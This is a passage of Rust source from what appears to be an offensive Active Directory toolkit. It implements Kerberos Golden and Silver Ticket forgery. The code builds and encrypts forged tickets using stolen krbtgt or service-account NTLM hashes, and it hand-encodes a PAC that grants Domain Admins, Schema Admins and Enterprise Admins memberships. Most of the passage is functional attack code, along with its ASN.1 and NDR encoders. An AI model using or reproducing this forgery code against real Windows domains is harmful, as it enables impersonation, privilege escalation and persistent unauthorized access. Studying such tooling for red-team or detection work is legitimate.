        "Golden Ticket forged: {} @ {} ({} bytes)",
        username,
        realm,
        ticket.build().len()
    );

    Ok(TicketGrantingData {
        ticket,
        session_key,
        session_key_etype: etype,
        client_principal: username.to_string(),
        client_realm: realm,
        end_time: Some(KerberosTime::from(endtime)),
    })
}

/// Forge a service ticket (Silver Ticket) using the service account's NTLM hash.
///
/// Creates a valid TGS without contacting the KDC by encrypting a crafted
/// EncTicketPart using the service account's key.
///
/// # Arguments
/// * `domain`      - Target domain
/// * `domain_sid`  - Domain SID
/// * `username`    - User to impersonate
/// * `user_rid`    - RID of the user
/// * `spn`         - Target SPN (e.g., "cifs/dc01.corp.local")
/// * `service_key` - Service account NTLM hash bytes (16 bytes for RC4)
/// * `etype`       - Encryption type
pub fn forge_service_ticket(
    domain: &str,
    domain_sid: &str,
    username: &str,
    user_rid: u32,
    spn: &str,
    service_key: &[u8],
    etype: i32,
) -> Result<TicketGrantingData> {
    let realm = domain.to_uppercase();
    info!(
        "Forging Silver Ticket: {}@{} → {} (etype={})",
        username, realm, spn, etype
    );

    let session_key = generate_session_key(etype);
    let pac_bytes = build_minimal_pac(domain_sid, username, user_rid, &realm);

    let now = Utc::now();
    let endtime = now + chrono::Duration::hours(10);
    let renew_till = now + chrono::Duration::days(7);

    let enc_ticket_part = build_enc_ticket_part(
        username,
        &realm,
        &session_key,
        etype,
        &now,
        &endtime,
        &renew_till,
        &pac_bytes,
    );

    // Encrypt with service key (key_usage = 2)
    let cipher = new_kerberos_cipher(etype)
        .map_err(|e| OverthroneError::Kerberos(format!("Cipher init: {e}")))?;
    let encrypted = cipher.encrypt(service_key, 2, &enc_ticket_part);

    // Parse SPN into PrincipalName
    let spn_parts: Vec<&str> = spn.splitn(2, '/').collect();
    let sname = PrincipalName {
        name_type: NT_SRV_INST,
        name_string: spn_parts.iter().map(|s| s.to_string()).collect(),
    };

    let ticket = Ticket {
        tkt_vno: 5,
        realm: realm.clone(),
        sname,
        enc_part: EncryptedData {
            etype,
            kvno: Some(1),
            cipher: encrypted,
        },
    };

    info!(
        "Silver Ticket forged: {} → {} ({} bytes)",
        username,
        spn,
        ticket.build().len()
    );

    Ok(TicketGrantingData {
        ticket,
        session_key,
        session_key_etype: etype,
        client_principal: username.to_string(),
        client_realm: realm,
        end_time: Some(KerberosTime::from(endtime)),
    })
}

// ═══════════════════════════════════════════════════════════
// Ticket Forging Internals
// ═══════════════════════════════════════════════════════════

/// Generate a random session key of appropriate length for the etype
fn generate_session_key(etype: i32) -> Vec<u8> {
    let len = match etype {
        ETYPE_RC4_HMAC => 16,
        ETYPE_AES128_CTS => 16,
        ETYPE_AES256_CTS => 32,
        _ => 16,
    };
    let mut key = vec![0u8; len];
    for byte in &mut key {
        *byte = rand::random();
    }
    key
}

/// Build EncTicketPart as raw DER bytes (ASN.1 manual construction)
///
/// EncTicketPart ::= [APPLICATION 3] SEQUENCE {
///     flags           [0] TicketFlags,
///     key             [1] EncryptionKey,
///     crealm          [2] Realm,
///     cname           [3] PrincipalName,
///     transited       [4] TransitedEncoding,
///     authtime        [5] KerberosTime,
///     starttime       [6] KerberosTime OPTIONAL,
///     endtime         [7] KerberosTime,
///     renew-till      [8] KerberosTime OPTIONAL,
///     caddr           [9] HostAddresses OPTIONAL,
///     authorization-data [10] AuthorizationData OPTIONAL
/// }
fn build_enc_ticket_part(
    username: &str,
    realm: &str,
    session_key: &[u8],
    etype: i32,
    now: &chrono::DateTime<Utc>,
    endtime: &chrono::DateTime<Utc>,
    renew_till: &chrono::DateTime<Utc>,
    pac: &[u8],
) -> Vec<u8> {
    let mut inner = Vec::new();

    // [0] flags — FORWARDABLE | RENEWABLE | PRE_AUTHENT | INITIAL
    let flags: u32 = 0x40800010; // forwardable(1) | renewable(8) | initial(24) | pre-authent(25)
    inner.extend_from_slice(&asn1_context_tag(0, &asn1_bitstring_u32(flags)));

    // [1] key — EncryptionKey { keytype, keyvalue }
    let enc_key = asn1_sequence(&[
        &asn1_context_tag(0, &asn1_integer(etype as i64)),
        &asn1_context_tag(1, &asn1_octet_string(session_key)),
    ]);
    inner.extend_from_slice(&asn1_context_tag(1, &enc_key));

    // [2] crealm
    inner.extend_from_slice(&asn1_context_tag(2, &asn1_general_string(realm)));

    // [3] cname — PrincipalName { name-type, name-string }
    let cname = asn1_sequence(&[
        &asn1_context_tag(0, &asn1_integer(NT_PRINCIPAL as i64)),
        &asn1_context_tag(1, &asn1_sequence_of_general_strings(&[username])),
    ]);
    inner.extend_from_slice(&asn1_context_tag(3, &cname));

    // [4] transited — TransitedEncoding { tr-type=0, contents="" }
    let transited = asn1_sequence(&[
        &asn1_context_tag(0, &asn1_integer(0)),
        &asn1_context_tag(1, &asn1_octet_string(&[])),
    ]);
    inner.extend_from_slice(&asn1_context_tag(4, &transited));

    // [5] authtime
    let time_str = format_kerberos_time(now);
    inner.extend_from_slice(&asn1_context_tag(5, &asn1_generalized_time(&time_str)));

    // [6] starttime
    inner.extend_from_slice(&asn1_context_tag(6, &asn1_generalized_time(&time_str)));

    // [7] endtime
    let end_str = format_kerberos_time(endtime);
    inner.extend_from_slice(&asn1_context_tag(7, &asn1_generalized_time(&end_str)));

    // [8] renew-till
    let renew_str = format_kerberos_time(renew_till);
    inner.extend_from_slice(&asn1_context_tag(8, &asn1_generalized_time(&renew_str)));

    // [10] authorization-data — wraps the PAC
    // AuthorizationData ::= SEQUENCE OF { ad-type[0] INTEGER, ad-data[1] OCTET STRING }
    // AD-IF-RELEVANT(1) wrapping AD-WIN2K-PAC(128)
    if !pac.is_empty() {
        let pac_authdata = asn1_sequence(&[
            &asn1_context_tag(0, &asn1_integer(128)), // AD-WIN2K-PAC
            &asn1_context_tag(1, &asn1_octet_string(pac)),
        ]);
        let if_relevant_inner = asn1_sequence_raw(&[&pac_authdata]);
        let if_relevant = asn1_sequence(&[
            &asn1_context_tag(0, &asn1_integer(1)), // AD-IF-RELEVANT
            &asn1_context_tag(1, &asn1_octet_string(&if_relevant_inner)),
        ]);
        let authdata = asn1_sequence_raw(&[&if_relevant]);
        inner.extend_from_slice(&asn1_context_tag(10, &authdata));
    }

    // Wrap in SEQUENCE, then APPLICATION 3
    let seq = asn1_sequence_raw_bytes(&inner);
    asn1_application_tag(3, &seq)
}

/// Build a minimal PAC (Privilege Attribute Certificate)
///
/// The PAC contains KERB_VALIDATION_INFO (NDR-encoded) which tells the
/// target service what groups the user belongs to. For a golden ticket,
/// we add Domain Admins (512), Enterprise Admins (519), etc.
fn build_minimal_pac(domain_sid: &str, username: &str, user_rid: u32, realm: &str) -> Vec<u8> {
    // PAC structure:
    //   PACTYPE header: cBuffers(u32), Version(u32)
    //   PAC_INFO_BUFFER[]: ulType(u32), cbBufferSize(u32), Offset(u64)
    //   <buffer data>
    //
    // We include only LOGON_INFORMATION (type 1)

    let logon_info = build_kerb_validation_info(domain_sid, username, user_rid, realm);

    // PAC_INFO_BUFFER for logon info
    let header_size = 8 + 16; // PACTYPE header + 1 buffer entry
    let logon_offset = header_size as u64;
    // Pad logon_info to 8-byte boundary
    let mut logon_padded = logon_info.clone();
    while !logon_padded.len().is_multiple_of(8) {
        logon_padded.push(0);
    }

    let mut pac = Vec::new();
    // PACTYPE header
    pac.extend_from_slice(&1u32.to_le_bytes()); // cBuffers = 1
    pac.extend_from_slice(&0u32.to_le_bytes()); // Version = 0

    // PAC_INFO_BUFFER for LOGON_INFORMATION
    pac.extend_from_slice(&1u32.to_le_bytes()); // ulType = 1 (LOGON_INFORMATION)
    pac.extend_from_slice(&(logon_padded.len() as u32).to_le_bytes()); // cbBufferSize
    pac.extend_from_slice(&logon_offset.to_le_bytes()); // Offset

    // Buffer data
    pac.extend_from_slice(&logon_padded);

    pac
}

/// Build KERB_VALIDATION_INFO (NDR-encoded) for the PAC
///
/// This is a simplified version that includes essential fields:
/// - LogonTime, UserId, PrimaryGroupId
/// - GroupIds (Domain Admins, etc.)
/// - LogonDomainName, EffectiveName
/// - LogonDomainId (domain SID)
fn build_kerb_validation_info(
    domain_sid: &str,
    username: &str,
    user_rid: u32,
    realm: &str,
) -> Vec<u8> {
    let mut buf = Vec::new();

    // NDR common header (private header for embedded type)
    // Version=1, Endian=LE, CommonHeaderLength=8
    buf.extend_from_slice(&[0x01, 0x10, 0x08, 0x00]); // Version(1), Endianness(LE), Header(8)
    buf.extend_from_slice(&[0xCC, 0xCC, 0xCC, 0xCC]); // Filler

    // Private header
    buf.extend_from_slice(&0u32.to_le_bytes()); // ObjectBufferLength (fill later)
    buf.extend_from_slice(&0u32.to_le_bytes()); // Filler

    let ndr_start = buf.len();

    // Referent ID for the top-level pointer
    buf.extend_from_slice(&0x00020000u32.to_le_bytes());

    // KERB_VALIDATION_INFO fields (simplified NDR encoding)
    // LogonTime (FILETIME) — current time as Windows FILETIME
    let filetime = chrono_to_filetime(&Utc::now());
    buf.extend_from_slice(&filetime.to_le_bytes()); // LogonTime
    buf.extend_from_slice(&0u64.to_le_bytes()); // LogoffTime (never)
    buf.extend_from_slice(&0u64.to_le_bytes()); // KickOffTime (never)
    buf.extend_from_slice(&filetime.to_le_bytes()); // PasswordLastSet
    buf.extend_from_slice(&0u64.to_le_bytes()); // PasswordCanChange
    buf.extend_from_slice(&0x7FFFFFFFFFFFFFFFu64.to_le_bytes()); // PasswordMustChange (never)

    // EffectiveName (RPC_UNICODE_STRING) — pointer, will be deferred
    let username_utf16: Vec<u8> = username
        .encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();
    let username_byte_len = username_utf16.len() as u16;
    buf.extend_from_slice(&username_byte_len.to_le_bytes()); // Length
    buf.extend_from_slice(&username_byte_len.to_le_bytes()); // MaximumLength
    buf.extend_from_slice(&0x00040000u32.to_le_bytes()); // Pointer (deferred)

    // FullName (RPC_UNICODE_STRING) — same as username for simplicity
    buf.extend_from_slice(&username_byte_len.to_le_bytes());
    buf.extend_from_slice(&username_byte_len.to_le_bytes());
    buf.extend_from_slice(&0x00080000u32.to_le_bytes());

    // LogonScript (empty)
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&0u32.to_le_bytes());

    // ProfilePath (empty)
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&0u32.to_le_bytes());

    // HomeDirectory (empty)
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&0u32.to_le_bytes());

    // HomeDirectoryDrive (empty)
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&0u32.to_le_bytes());

    // LogonCount, BadPasswordCount
    buf.extend_from_slice(&100u16.to_le_bytes()); // LogonCount
    buf.extend_from_slice(&0u16.to_le_bytes()); // BadPasswordCount

    // UserId, PrimaryGroupId
    buf.extend_from_slice(&user_rid.to_le_bytes()); // UserId (500 for Admin)
    buf.extend_from_slice(&513u32.to_le_bytes()); // PrimaryGroupId (Domain Users)

    // GroupCount + GroupIds pointer
    // Groups: Domain Admins(512), Domain Users(513), Schema Admins(518),
    //         Enterprise Admins(519), Group Policy Creator(520)
    let group_rids: Vec<u32> = vec![512, 513, 518, 519, 520];
    buf.extend_from_slice(&(group_rids.len() as u32).to_le_bytes()); // GroupCount
    buf.extend_from_slice(&0x000C0000u32.to_le_bytes()); // GroupIds pointer

    // UserFlags
    buf.extend_from_slice(&0x20u32.to_le_bytes()); // LOGON_EXTRA_SIDS

    // UserSessionKey (16 zero bytes)
    buf.extend_from_slice(&[0u8; 16]);

    // LogonServer (RPC_UNICODE_STRING)
    let server = "DC01".to_string();
    let server_utf16: Vec<u8> = server
        .encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();
    let server_byte_len = server_utf16.len() as u16;
    buf.extend_from_slice(&server_byte_len.to_le_bytes());
    buf.extend_from_slice(&server_byte_len.to_le_bytes());
    buf.extend_from_slice(&0x00100000u32.to_le_bytes());

    // LogonDomainName (RPC_UNICODE_STRING)
    let domain_utf16: Vec<u8> = realm.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
    let domain_byte_len = domain_utf16.len() as u16;
    buf.extend_from_slice(&domain_byte_len.to_le_bytes());
    buf.extend_from_slice(&domain_byte_len.to_le_bytes());
    buf.extend_from_slice(&0x00140000u32.to_le_bytes());

    // LogonDomainId (PSID pointer)
    buf.extend_from_slice(&0x00180000u32.to_le_bytes());

    // Reserved1 (2 x u32)
    buf.extend_from_slice(&[0u8; 8]);

    // UserAccountControl
    buf.extend_from_slice(&0x00000010u32.to_le_bytes()); // NORMAL_ACCOUNT

    // SubAuthStatus, LastSuccessfulILogon, LastFailedILogon, FailedILogonCount
    buf.extend_from_slice(&0u32.to_le_bytes());
    buf.extend_from_slice(&0u64.to_le_bytes());
    buf.extend_from_slice(&0u64.to_le_bytes());
    buf.extend_from_slice(&0u32.to_le_bytes());

    // Reserved3 (2 x u32)
    buf.extend_from_slice(&[0u8; 8]);

    // SidCount + ExtraSids pointer
    buf.extend_from_slice(&0u32.to_le_bytes()); // SidCount = 0
    buf.extend_from_slice(&0u32.to_le_bytes()); // ExtraSids = NULL

    // ResourceGroupDomainSid (NULL), ResourceGroupCount, ResourceGroupIds (NULL)
    buf.extend_from_slice(&0u32.to_le_bytes());
    buf.extend_from_slice(&0u32.to_le_bytes());
    buf.extend_from_slice(&0u32.to_le_bytes());

    // ═══════════════════════════════════════════
    // Deferred pointers (conformant data)
    // ═══════════════════════════════════════════

    // EffectiveName string data
    ndr_write_conformant_string(&mut buf, &username_utf16);

    // FullName string data
    ndr_write_conformant_string(&mut buf, &username_utf16);

    // GroupIds array (GROUP_MEMBERSHIP: RelativeId u32, Attributes u32)
    buf.extend_from_slice(&(group_rids.len() as u32).to_le_bytes()); // MaxCount
    for rid in &group_rids {
        buf.extend_from_slice(&rid.to_le_bytes()); // RelativeId
        buf.extend_from_slice(&0x00000007u32.to_le_bytes()); // Attributes: SE_GROUP_*
    }

    // LogonServer string data
    ndr_write_conformant_string(&mut buf, &server_utf16);

    // LogonDomainName string data
    ndr_write_conformant_string(&mut buf, &domain_utf16);

    // LogonDomainId (SID)
    let sid_bytes = parse_sid_to_bytes(domain_sid);
    buf.extend_from_slice(&((sid_bytes.len() / 4) as u32).to_le_bytes()); // MaxCount
    buf.extend_from_slice(&sid_bytes);

    // Pad to 8-byte boundary
    while buf.len() % 8 != 0 {
        buf.push(0);
    }

    // Fill in ObjectBufferLength
    let ndr_len = (buf.len() - ndr_start) as u32;
    buf[8..12].copy_from_slice(&ndr_len.to_le_bytes());

    buf
}

/// Write an NDR conformant varying string (MaxCount, Offset, ActualCount, data)
fn ndr_write_conformant_string(buf: &mut Vec<u8>, utf16_bytes: &[u8]) {
    let char_count = (utf16_bytes.len() / 2) as u32;
    buf.extend_from_slice(&char_count.to_le_bytes()); // MaxCount
    buf.extend_from_slice(&0u32.to_le_bytes()); // Offset
    buf.extend_from_slice(&char_count.to_le_bytes()); // ActualCount
    buf.extend_from_slice(utf16_bytes);
    // Pad to 4-byte boundary
    while !buf.len().is_multiple_of(4) {
        buf.push(0);
    }
}

/// Parse a SID string ("S-1-5-21-...") into binary format
fn parse_sid_to_bytes(sid_str: &str) -> Vec<u8> {
    let parts: Vec<&str> = sid_str.split('-').collect();
    if parts.len() < 4 || parts[0] != "S" {
        // Return a dummy SID
        return vec![
            0x01, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x15, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ];
    }

    let revision: u8 = parts[1].parse().unwrap_or(1);
    let authority: u64 = parts[2].parse().unwrap_or(5);
    let sub_authorities: Vec<u32> = parts[3..].iter().filter_map(|s| s.parse().ok()).collect();

    let mut sid = Vec::new();
    sid.push(revision);
    sid.push(sub_authorities.len() as u8);
    // Authority (6 bytes big-endian)
    sid.extend_from_slice(&{ authority }.to_be_bytes()[2..8]);
    // Sub-authorities (little-endian u32)
    for sub in &sub_authorities {
        sid.extend_from_slice(&sub.to_le_bytes());
    }
    sid
}

/// Convert chrono DateTime to Windows FILETIME (100-nanosecond intervals since 1601-01-01)
fn chrono_to_filetime(dt: &chrono::DateTime<Utc>) -> u64 {
    // Offset between 1601-01-01 and 1970-01-01 in 100ns intervals
    const EPOCH_DIFF: u64 = 116_444_736_000_000_000;
    let unix_100ns = dt.timestamp() as u64 * 10_000_000 + dt.timestamp_subsec_nanos() as u64 / 100;
    unix_100ns + EPOCH_DIFF
}

// ═══════════════════════════════════════════════════════════
// ASN.1 DER Encoding Helpers (for manual EncTicketPart construction)
// ═══════════════════════════════════════════════════════════

/// Encode DER length
fn asn1_length(len: usize) -> Vec<u8> {
    if len < 0x80 {
        vec![len as u8]
    } else if len < 0x100 {
        vec![0x81, len as u8]
    } else if len < 0x10000 {
        vec![0x82, (len >> 8) as u8, (len & 0xFF) as u8]
    } else {
        vec![
            0x83,
            (len >> 16) as u8,
            (len >> 8 & 0xFF) as u8,
            (len & 0xFF) as u8,
        ]
    }
}

/// Build ASN.1 context-specific tag [n] EXPLICIT
fn asn1_context_tag(n: u8, data: &[u8]) -> Vec<u8> {
    let tag = 0xA0 | n;
    let mut out = vec![tag];
    out.extend_from_slice(&asn1_length(data.len()));
    out.extend_from_slice(data);
    out
}

/// Build ASN.1 APPLICATION tag [n] CONSTRUCTED
fn asn1_application_tag(n: u8, data: &[u8]) -> Vec<u8> {
    let tag = 0x60 | n; // APPLICATION + CONSTRUCTED
    let mut out = vec![tag];
    out.extend_from_slice(&asn1_length(data.len()));
    out.extend_from_slice(data);
    out
}

/// Build ASN.1 SEQUENCE from parts
fn asn1_sequence(parts: &[&[u8]]) -> Vec<u8> {
    let inner: Vec<u8> = parts.iter().flat_map(|p| p.iter().copied()).collect();
    asn1_sequence_raw_bytes(&inner)
}

/// Build ASN.1 SEQUENCE from raw concatenated bytes
fn asn1_sequence_raw_bytes(inner: &[u8]) -> Vec<u8> {
    let mut out = vec![0x30]; // SEQUENCE tag
    out.extend_from_slice(&asn1_length(inner.len()));
    out.extend_from_slice(inner);
    out
}

/// Build ASN.1 SEQUENCE OF from raw elements
fn asn1_sequence_raw(elements: &[&[u8]]) -> Vec<u8> {
    let inner: Vec<u8> = elements.iter().flat_map(|e| e.iter().copied()).collect();
    asn1_sequence_raw_bytes(&inner)
}

/// ASN.1 INTEGER
fn asn1_integer(val: i64) -> Vec<u8> {
    let mut out = vec![0x02]; // INTEGER tag
    if (0..0x80).contains(&val) {
        out.push(1);
        out.push(val as u8);
    } else if (0..0x8000).contains(&val) {
        if val < 0x100 {
            if val >= 0x80 {
                out.push(2);
                out.push(0);
                out.push(val as u8);
            } else {
                out.push(1);
                out.push(val as u8);
            }
        } else {
            out.push(2);
            out.push((val >> 8) as u8);
            out.push((val & 0xFF) as u8);
        }
    } else {
        // Encode as variable-length big-endian
        let bytes = val.to_be_bytes();
        let start = bytes.iter().position(|&b| b != 0 && b != 0xFF).unwrap_or(7);
        let significant = &bytes[start..];
        // Add leading zero if high bit set (positive number)
        if val >= 0 && significant[0] & 0x80 != 0 {
            out.push((significant.len() + 1) as u8);
            out.push(0);
        } else {
            out.push(significant.len() as u8);
        }
        out.extend_from_slice(significant);
    }
    out
}

/// ASN.1 OCTET STRING
fn asn1_octet_string(data: &[u8]) -> Vec<u8> {
    let mut out = vec![0x04];
    out.extend_from_slice(&asn1_length(data.len()));
    out.extend_from_slice(data);
    out
}

/// ASN.1 BIT STRING from u32 flags (Kerberos TicketFlags)
fn asn1_bitstring_u32(flags: u32) -> Vec<u8> {
    let mut out = vec![0x03]; // BIT STRING tag
    out.push(5); // length: 1 byte unused bits + 4 bytes data
    out.push(0); // 0 unused bits
    out.extend_from_slice(&flags.to_be_bytes());
    out
}

/// ASN.1 GeneralString
fn asn1_general_string(s: &str) -> Vec<u8> {
    let mut out = vec![0x1B]; // GeneralString tag
    out.extend_from_slice(&asn1_length(s.len()));
    out.extend_from_slice(s.as_bytes());
    out
}

/// ASN.1 GeneralizedTime (format: "YYYYMMDDHHmmssZ")
fn asn1_generalized_time(time_str: &str) -> Vec<u8> {
    let mut out = vec![0x18]; // GeneralizedTime tag
    out.extend_from_slice(&asn1_length(time_str.len()));
    out.extend_from_slice(time_str.as_bytes());
    out
}

/// ASN.1 SEQUENCE OF GeneralString
fn asn1_sequence_of_general_strings(strings: &[&str]) -> Vec<u8> {
    let parts: Vec<Vec<u8>> = strings.iter().map(|s| asn1_general_string(s)).collect();
    let inner: Vec<u8> = parts.into_iter().flatten().collect();
    asn1_sequence_raw_bytes(&inner)
}

/// Format a chrono DateTime as Kerberos GeneralizedTime ("YYYYMMDDHHmmssZ")
fn format_kerberos_time(dt: &chrono::DateTime<Utc>) -> String {
    dt.format("%Y%m%d%H%M%SZ").to_string()
}

/// Hex encode bytes to lowercase hex string
fn hex_encode(data: &[u8]) -> String {
    data.iter().map(|b| format!("{:02x}", b)).collect()
}
